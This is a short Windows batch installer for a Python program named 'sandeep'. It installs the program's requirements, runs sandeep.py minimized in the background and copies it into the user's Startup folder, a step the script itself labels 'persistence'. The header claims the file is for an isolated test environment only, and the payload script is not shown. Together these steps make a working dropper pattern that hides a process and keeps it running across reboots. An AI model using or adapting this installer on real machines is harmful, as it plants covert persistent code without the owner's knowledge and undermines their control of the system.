@echo off
REM =======================================
REM sandeep - Windows Install & Startup
REM For isolated test environment only
REM =======================================

echo [+] Installing sandeep...

REM Navigate to script directory
cd /d "%~dp0"

REM Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [X] Python is not installed. Please install Python 3.x
    pause
    exit /b
)

REM Upgrade pip and install requirements
echo [+] Installing Python requirements...
python -m pip install --upgrade pip
python -m pip install -r requirements.txt

REM Run in background
echo [+] Starting sandeep...
start /min python sandeep.py

REM Add to Windows startup for persistence
echo [+] Setting up persistence...
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y "%~dp0sandeep.py" "%STARTUP_FOLDER%" >nul

echo [✅] sandeep is now running in the background with persistence!
pause